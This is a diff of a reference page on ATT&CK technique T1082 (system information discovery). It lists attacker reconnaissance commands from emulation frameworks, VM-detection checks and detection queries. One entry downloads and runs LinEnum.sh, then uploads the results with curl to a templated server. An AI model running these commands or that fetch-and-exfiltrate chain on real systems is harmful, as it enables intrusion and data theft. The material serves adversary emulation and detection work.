@@ -31,33 +31,27 @@ Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure a
 ## Potential Commands
 
 ```
-ver
 shell ver
+ver
+get_env.rb
 set
 shell set
-get_env.rb
-net config workstation
-net config server
 shell net config workstation
 shell net config server
+net config workstation
+net config server
+sysinfo, run winenum, get_env.rb
 systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
 systemprofiler tool if no access yet (victim browses to website)
 or
 shell systeminfo (if you already have a beacon)
-sysinfo, run winenum, get_env.rb
-systeminfo
-reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
-
-system_profiler
-ls -al /Applications
-
+REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
 uname -a >> /tmp/T1082.txt
 if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi;
 if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi;      
 if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi;
 uptime >> /tmp/T1082.txt
 cat /tmp/T1082.txt 2>/dev/null
-
 if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;
 if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi;
 if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi;
@@ -66,28 +60,26 @@ if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
 if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi;
 if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi;
 if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi;
-
+systeminfo
+reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
+system_profiler
+ls -al /Applications
 sudo lsmod | grep -i "vboxsf\|vboxguest"
 sudo lsmod | grep -i "vmw_baloon\|vmxnet"
 sudo lsmod | grep -i "xen-vbd\|xen-vnif"
 sudo lsmod | grep -i "virtio_pci\|virtio_net"
 sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
-
 hostname
-
-hostname
-
-REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
-
-{'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}}
-{'darwin': {'sh': {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n'}}, 'linux': {'sh': {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n'}}}
-{'linux': {'sh': {'command': "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", 'cleanup': 'rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n'}}}
-{'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}}
-powershell/situational_awareness/host/computerdetails
+$PSVersionTable
+find / -type d -user #{host.user.name} \( -perm -g+w -or -perm -o+w \) 2>/dev/null -exec ls -adl {} \;
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;
+chmod +x LinEnum.sh;
+./LinEnum.sh > /tmp/exfil.txt;
+curl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;
+cat /tmp/exfil.txt;
+[environment]::OSVersion.Version
 powershell/situational_awareness/host/computerdetails
 powershell/situational_awareness/host/winenum
-powershell/situational_awareness/host/winenum
-powershell/situational_awareness/network/powerview/get_computer
 powershell/situational_awareness/network/powerview/get_computer
 ```
 
@@ -180,31 +172,26 @@ powershell/situational_awareness/network/powerview/get_computer
              '/v MachineGuid\n',
   'name': None,
   'source': 'atomics/T1082/T1082.yaml'},
- {'command': {'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}},
+ {'command': '$PSVersionTable\n',
   'name': 'Discover the PowerShell version',
   'source': 'data/abilities/discovery/29451844-9b76-4e16-a9ee-d6feab4b24db.yml'},
- {'command': {'darwin': {'sh': {'command': 'find / -type d -user '
-                                           '#{host.user.name} \\( -perm -g+w '
-                                           '-or -perm -o+w \\) 2>/dev/null '
-                                           '-exec ls -adl {} \\;\n'}},
-              'linux': {'sh': {'command': 'find / -type d -user '
-                                          '#{host.user.name} \\( -perm -g+w '
-                                          '-or -perm -o+w \\) 2>/dev/null '
-                                          '-exec ls -adl {} \\;\n'}}},
+ {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm '
+             '-o+w \\) 2>/dev/null -exec ls -adl {} \\;\n',
   'name': 'Discover all directories containing deletable files by user',
   'source': 'data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml'},
- {'command': {'linux': {'sh': {'cleanup': 'rm ./LinEnum.sh;\n'
-                                          'rm /tmp/exfil.txt;\n',
-                               'command': 'wget '
-                                          'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\n'
-                                          'chmod +x LinEnum.sh;\n'
-                                          './LinEnum.sh > /tmp/exfil.txt;\n'
-                                          "curl -F 'data=@/tmp/exfil.txt' "
-                                          '#{server}/file/upload ;\n'
-                                          'cat /tmp/exfil.txt;\n'}}},
+ {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm '
+             '-o+w \\) 2>/dev/null -exec ls -adl {} \\;\n',
+  'name': 'Discover all directories containing deletable files by user',
+  'source': 'data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml'},
+ {'command': 'wget '
+             'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\n'
+             'chmod +x LinEnum.sh;\n'
+             './LinEnum.sh > /tmp/exfil.txt;\n'
+             "curl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\n"
+             'cat /tmp/exfil.txt;\n',
   'name': 'Download and execute LinEnum.sh',
   'source': 'data/abilities/discovery/46098c66-8d9a-4d23-8a95-dd5021c385ae.yml'},
- {'command': {'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}},
+ {'command': '[environment]::OSVersion.Version\n',
   'name': 'Find OS Version',
   'source': 'data/abilities/discovery/b6b105b9-41dc-490b-bc5c-80d699b82ce8.yml'},
  {'command': 'powershell/situational_awareness/host/computerdetails',
@@ -297,7 +284,30 @@ powershell/situational_awareness/network/powerview/get_computer
   'query': 'Sysmon| where EventID == 1 and (process_path '
            'contains"sysinfo.exe"or process_path contains "reg.exe")and '
            'process_command_line contains "reg*query '
-           'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum"'}]
+           'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum"'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: Information found in the windows system\n'
+           'description: windows server 2012 test results\n'
+           'references: '
+           'https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md\n'
+           'tags: T1082\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security\n'
+           'detection:\n'
+           '    selection:\n'
+           '        EventID: 4688 # have created a new process.\n'
+           "        Newprocessname: 'C: \\ Windows \\ System32 \\ "
+           "systeminfo.exe' # new process name\n"
+           "        Tokenpromotiontype: 'TokenElevationTypeDefault (1)' # "
+           'token type lifting\n'
+           "        Processcommandline: 'systeminfo' # command-line process\n"
+           '    condition: selection\n'
+           'level: medium'}]
 ```
 
 ## Raw Dataset
